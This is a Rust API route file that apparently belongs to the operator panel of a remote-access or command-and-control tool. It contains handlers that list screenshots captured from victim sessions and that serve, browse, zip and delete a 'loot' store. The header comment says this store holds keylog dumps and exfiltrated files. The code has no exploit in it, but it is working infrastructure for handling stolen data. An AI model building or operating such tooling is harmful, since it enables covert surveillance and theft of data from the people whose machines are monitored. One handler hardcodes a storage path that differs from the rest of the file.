// src/api/routes/downloads.rs
//
// GET /api/hosts/:id/screenshots
//   Lists the RCM Sec-11 screenshots stored in the session's package,
//   newest-first, so the panel can pick up the latest capture.
//
// GET /api/downloads/*path
//   Serves any file under the server-side `downloads/` directory.
//   Path traversal is blocked by rejecting `..` components.
//   Requires X-API-KEY auth (enforced by the router's middleware layer;
//   ?key=<api_key> is accepted as a fallback for <img>/<a href> uses).
//   NOTE: this route must never be registered in public_routes - it serves
//   screenshots, keylog dumps, and exfiltrated files.

use axum::{
    extract::{Path, State},
    response::{IntoResponse, Response},
    http::{StatusCode, header},
    Json,
    body::StreamBody,
};
use std::{path::PathBuf, sync::Arc};
use crate::api::state::ApiContext;
use crate::config::config;

// ── Screenshot listing (RCM Sec-11 layout) ────────────────────────────────────

/// One stored screenshot frame, addressed relative to downloads/.
#[derive(serde::Serialize)]
struct ShotEntry {
    file: String,              // "<RootFolder>/output/screenshots/<name>"
    ts: String,                // "YYYYMMDD-HHMMSS" from the Sec-11 filename
    monitor: Option<u64>,      // digits after "monitor" in toolspecific
}

/// Parse a Sec-11 screenshot filename
/// `screenshot.<YYYYMMDD-HHMMSS>.<toolspecific>[.<counter>].<ext>`
/// into a ShotEntry. Sidecars (*.RCM.xml) and non-screenshot files are skipped.
fn parse_shot_name(name: &str, root_name: &str) -> Option<ShotEntry> {
    if !name.starts_with("screenshot.") || name.ends_with(".RCM.xml") {
        return None;
    }
    let parts: Vec<&str> = name.split('.').collect();
    if parts.len() < 4 {
        return None;
    }
    let ts = parts[1];
    // is_ascii guards the byte-slicing below: a 15-byte non-ASCII ts would
    // otherwise panic on the non-char-boundary slices ts[..8] / ts[9..].
    if ts.len() != 15
        || !ts.is_ascii()
        || !ts[..8].chars().all(|c| c.is_ascii_digit())
        || &ts[8..9] != "-"
        || !ts[9..].chars().all(|c| c.is_ascii_digit())
    {
        return None;
    }
    let toolspecific = parts[2];
    let monitor = toolspecific.strip_prefix("monitor").and_then(|rest| {
        let digits: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
        if digits.is_empty() { None } else { digits.parse::<u64>().ok() }
    });
    Some(ShotEntry {
        file: format!("{}/output/screenshots/{}", root_name, name),
        ts: ts.to_string(),
        monitor,
    })
}

/// GET /api/hosts/:id/screenshots
///
/// Resolves the session's RCM package (hostname/computer_id from the
/// sessions table) via a marker-verified, NON-CREATING lookup and lists
/// the Sec-11 screenshots stored in it, newest-first. `folders` is kept for
/// older panels; the updated panel consumes `shots`.
///
/// The lookup mirrors session::package_if_exists: it scans root-name
/// candidates and accepts only the one whose `.rcmtarget` marker matches
/// THIS session's target identity - so two targets sharing a hostname
/// (different computer_id) can never be handed each other's screenshots -
/// and it never creates a package (a GET must not mint package dirs; with
/// lazy packages a session may legitimately have none yet).
pub async fn list_screenshots(
    Path(session_id): Path<u32>,
    State(state): State<Arc<ApiContext>>,
) -> impl IntoResponse {
    let (folders, shots) = tokio::task::spawn_blocking(move || {
        let (hostname, computer_id) = state
            .db
            .get()
            .ok()
            .and_then(|conn| {
                conn.query_row(
                    "SELECT hostname, computer_id FROM sessions WHERE id = ?1",
                    rusqlite::params![session_id],
                    |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?)),
                )
                .ok()
            })
            .unwrap_or_default();

        let empty: (Vec<String>, Vec<ShotEntry>) = (vec![], vec![]);
        if hostname.is_empty() && computer_id.is_empty() {
            return empty;
        }

        let Some(pkg) = crate::server::session::package_if_exists(&hostname, &computer_id)
            else { return empty };

        let shots_dir = pkg.root().join("output").join("screenshots");
        let root_name = pkg.root_name();
        let mut shots: Vec<ShotEntry> = Vec::new();
        if let Ok(entries) = std::fs::read_dir(&shots_dir) {
            for e in entries.flatten() {
                // Never follow symlinks inside the package.
                if e.file_type().map(|t| t.is_symlink()).unwrap_or(true) {
                    continue;
                }
                if let Some(shot) = parse_shot_name(
                    &e.file_name().to_string_lossy(),
                    &root_name,
                ) {
                    shots.push(shot);
                }
            }
        }
        // Newest-first (ts is fixed-width so lexicographic sort works).
        shots.sort_by(|a, b| b.ts.cmp(&a.ts).then_with(|| b.file.cmp(&a.file)));

        let folders = if shots_dir.is_dir() {
            vec![format!("{}/output/screenshots", root_name)]
        } else {
            vec![]
        };
        (folders, shots)
    })
    .await
    .unwrap_or_default();

    Json(serde_json::json!({ "folders": folders, "shots": shots }))
}

// ── File serving ──────────────────────────────────────────────────────────────
// The "downloads" storage root below matches rcm::registry()'s base; see the
// note there on why it is not yet read from config.rcm.storage_base.

pub async fn serve_download(Path(path): Path<String>) -> Response {
    // Block path traversal: reject any component that is or contains ".."
    let safe: PathBuf = path
        .split('/')
        .filter(|seg| !seg.is_empty() && *seg != ".." && !seg.contains(".."))
        .collect();

    if safe.components().count() == 0 {
        return StatusCode::BAD_REQUEST.into_response();
    }

    let full = PathBuf::from(crate::config::config().rcm.storage_base.as_str()).join(&safe);

    match tokio::fs::read(&full).await {
        Ok(bytes) => {
            // Guess MIME type from extension; fall back to octet-stream
            let mime = match full.extension().and_then(|e| e.to_str()).unwrap_or("") {
                "png"  => "image/png",
                "jpg" | "jpeg" => "image/jpeg",
                "json" => "application/json",
                "txt"  => "text/plain",
                _      => "application/octet-stream",
            };
            (
                StatusCode::OK,
                [(header::CONTENT_TYPE, mime)],
                bytes,
            ).into_response()
        }
        Err(_) => StatusCode::NOT_FOUND.into_response(),
    }
}

// ── Loot directory listing ────────────────────────────────────────────────────

#[derive(serde::Serialize)]
pub struct LootEntry {
    pub name: String,
    pub path: String,      // relative to downloads/
    pub is_dir: bool,
    pub size: u64,
    pub modified: u64,     // Unix timestamp
    pub children: Option<Vec<LootEntry>>,
}

/// Walk one level of `downloads/<subpath>` and return the entries.
/// If subpath is empty, lists the root of downloads/.
/// Directories are returned with children = None (client requests them on expand).
fn list_dir(rel: &str) -> Vec<LootEntry> {
    let base = std::path::Path::new(crate::config::config().rcm.storage_base.as_str());
    let target = if rel.is_empty() { base.to_path_buf() } else {
        // block traversal
        let safe: std::path::PathBuf = rel.split('/').filter(|s| !s.is_empty() && !s.contains("..")).collect();
        base.join(safe)
    };

    let Ok(dir) = std::fs::read_dir(&target) else { return vec![]; };

    let mut entries: Vec<LootEntry> = dir
        .filter_map(|e| {
            let e = e.ok()?;
            let meta = e.metadata().ok()?;
            let name = e.file_name().into_string().ok()?;
            let modified = meta
                .modified().ok()
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            let rel_path = if rel.is_empty() {
                name.clone()
            } else {
                format!("{}/{}", rel, &name)
            };
            Some(LootEntry {
                name,
                path: rel_path,
                is_dir: meta.is_dir(),
                size: if meta.is_file() { meta.len() } else { 0 },
                modified,
                children: None,
            })
        })
        .collect();

    entries.sort_by(|a, b| {
        match (a.is_dir, b.is_dir) {
            (true, false) => std::cmp::Ordering::Less,
            (false, true) => std::cmp::Ordering::Greater,
            _ => b.modified.cmp(&a.modified),  // newest first
        }
    });
    entries
}

/// GET /api/loot?path=<optional_subpath>
pub async fn list_loot(
    axum::extract::Query(params): axum::extract::Query<std::collections::HashMap<String, String>>,
) -> impl IntoResponse {
    let subpath = params.get("path").map(|s| s.as_str()).unwrap_or("");
    let entries = tokio::task::spawn_blocking({
        let subpath = subpath.to_string();
        move || list_dir(&subpath)
    }).await.unwrap_or_default();

    Json(serde_json::json!({ "path": subpath, "entries": entries }))
}

/// GET /api/loot/zip?path=<folder_path>
/// Recursively zips everything under downloads/<path> and returns it as
/// a single application/zip download. Useful for pulling an entire
/// session's loot folder in one click from the panel.
pub async fn zip_loot(
    axum::extract::Query(params): axum::extract::Query<std::collections::HashMap<String, String>>,
) -> Response {
    let subpath = match params.get("path") {
        Some(p) if !p.is_empty() => p.clone(),
        _ => return (StatusCode::BAD_REQUEST, "path required").into_response(),
    };

    let safe: PathBuf = subpath
        .split('/')
        .filter(|s| !s.is_empty() && !s.contains(".."))
        .collect();
    if safe.components().count() == 0 {
        return StatusCode::BAD_REQUEST.into_response();
    }

    let full      = PathBuf::from("downloads").join(&safe);
    let zip_name  = format!(
        "{}.zip",
        safe.file_name().and_then(|n| n.to_str()).unwrap_or("loot")
    );

    if !full.is_dir() {
        return (StatusCode::NOT_FOUND, "Not a directory").into_response();
    }

    // ── Streaming zip via channel ─────────────────────────────────────────────
    //
    // The zip bytes are produced in a spawn_blocking thread by
    // streaming_zip::write_zip_directory and forwarded through a bounded
    // mpsc channel to the Axum response body. Because we never buffer the
    // whole archive, RAM usage is constant regardless of folder size - a 1 TB
    // folder uses the same ~64 KB copy buffer as a 1 KB folder.
    //
    // No temp file is needed: the previous approach wrote a tempfile first
    // (limiting the archive size to available temp-disk space) then streamed
    // it back. The streaming approach has no such limit.

    let base_path = full.parent()
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| full.clone());

    // Bounded channel: 32 x 64 KB = ~2 MB in flight at a time by default.
    // The writer blocks (backpressure) if the HTTP layer can't keep up.
    let zip_chunk = config().transfer.zip_chunk_bytes;
    let (tx, rx) = tokio::sync::mpsc::channel::<Vec<u8>>(config().transfer.zip_channel_chunks);

    tokio::task::spawn_blocking(move || {
        /// Write impl that batches output into zip_chunk_bytes-sized chunks
        /// and sends them through the channel. Implements backpressure via
        /// blocking_send.
        struct ChanWriter {
            tx:  tokio::sync::mpsc::Sender<Vec<u8>>,
            buf: Vec<u8>,
            chunk: usize,
        }
        impl std::io::Write for ChanWriter {
            fn write(&mut self, data: &[u8]) -> std::io::Result<usize> {
                self.buf.extend_from_slice(data);
                while self.buf.len() >= self.chunk {
                    let chunk: Vec<u8> = self.buf.drain(..self.chunk).collect();
                    self.tx.blocking_send(chunk).map_err(|_| {
                        std::io::Error::new(std::io::ErrorKind::BrokenPipe, "client gone")
                    })?;
                }
                Ok(data.len())
            }
            fn flush(&mut self) -> std::io::Result<()> {
                if !self.buf.is_empty() {
                    let tail = std::mem::take(&mut self.buf);
                    self.tx.blocking_send(tail).map_err(|_| {
                        std::io::Error::new(std::io::ErrorKind::BrokenPipe, "client gone")
                    })?;
                }
                Ok(())
            }
        }
        impl Drop for ChanWriter {
            fn drop(&mut self) {
                use std::io::Write as _;
                let _ = self.flush();
            }
        }

        let mut w = ChanWriter { tx, buf: Vec::with_capacity(zip_chunk), chunk: zip_chunk };
        // Errors (e.g. file disappeared mid-zip, client disconnected) are
        // logged at debug level; the channel close signals EOF to the client.
        if let Err(e) = crate::streaming_zip::write_zip_directory(&mut w, &base_path, &full) {
            tracing::debug!(err = %e, "zip_loot: streaming zip aborted");
        }
    });

    // Convert the channel receiver into an async stream for StreamBody.
    let stream = futures::stream::unfold(rx, |mut rx| async move {
        rx.recv().await.map(|chunk| (Ok::<Vec<u8>, std::io::Error>(chunk), rx))
    });
    let body = StreamBody::new(stream);

    use axum::http::{HeaderMap, HeaderValue};
    let mut headers = HeaderMap::new();
    headers.insert(header::CONTENT_TYPE,
        HeaderValue::from_static("application/zip"));
    headers.insert(header::CONTENT_DISPOSITION,
        HeaderValue::from_str(&format!("attachment; filename=\"{}\"", zip_name))
            .unwrap_or_else(|_| HeaderValue::from_static("attachment")));
    // Content-Length is intentionally omitted: the streaming zip computes CRC
    // and sizes on the fly, so the total length is not known before writing.

    (StatusCode::OK, headers, body).into_response()
}


/// DELETE /api/loot?path=<file_or_dir>
/// Removes a single file or an empty directory from downloads/.
pub async fn delete_loot(
    axum::extract::Query(params): axum::extract::Query<std::collections::HashMap<String, String>>,
) -> impl IntoResponse {
    let subpath = match params.get("path") {
        Some(p) if !p.is_empty() => p.clone(),
        _ => return StatusCode::BAD_REQUEST.into_response(),
    };
    let safe: std::path::PathBuf = subpath.split('/').filter(|s| !s.is_empty() && !s.contains("..")).collect();
    let full = std::path::PathBuf::from(crate::config::config().rcm.storage_base.as_str()).join(safe);

    let result = tokio::task::spawn_blocking(move || {
        if full.is_dir() { std::fs::remove_dir_all(&full) } else { std::fs::remove_file(&full) }
    }).await;

    match result {
        Ok(Ok(_)) => StatusCode::NO_CONTENT.into_response(),
        _ => StatusCode::NOT_FOUND.into_response(),
    }
}


#[cfg(test)]
mod tests {
    use super::parse_shot_name;

    #[test]
    fn parse_shot_name_accepts_valid_sec11_name() {
        let shot = parse_shot_name("screenshot.20260722-081100.monitor0.png", "HOST-A")
            .expect("valid Sec-11 name");
        assert_eq!(shot.ts, "20260722-081100");
        assert_eq!(shot.monitor, Some(0));
        assert_eq!(shot.file, "HOST-A/output/screenshots/screenshot.20260722-081100.monitor0.png");
    }

    #[test]
    fn parse_shot_name_skips_sidecars_and_foreign_files() {
        assert!(parse_shot_name("screenshot.20260722-081100.monitor0.RCM.xml", "H").is_none());
        assert!(parse_shot_name("other.20260722-081100.monitor0.png", "H").is_none());
        assert!(parse_shot_name("screenshot.short.monitor0.png", "H").is_none());
    }

    #[test]
    fn parse_shot_name_non_ascii_15byte_ts_does_not_panic() {
        // 15 BYTES but only 8 chars, non-ASCII: the old byte-slicing
        // (ts[..8] / ts[9..]) panicked on the non-char boundary, blanking
        // the whole screenshot listing. Must return None instead.
        // "ééééé" = 10 bytes + "12345" = 15 bytes total.
        let name = "screenshot.ééééé12345.monitor0.png";
        assert_eq!(name.split('.').nth(1).unwrap().len(), 15);
        assert!(parse_shot_name(name, "H").is_none());
    }
}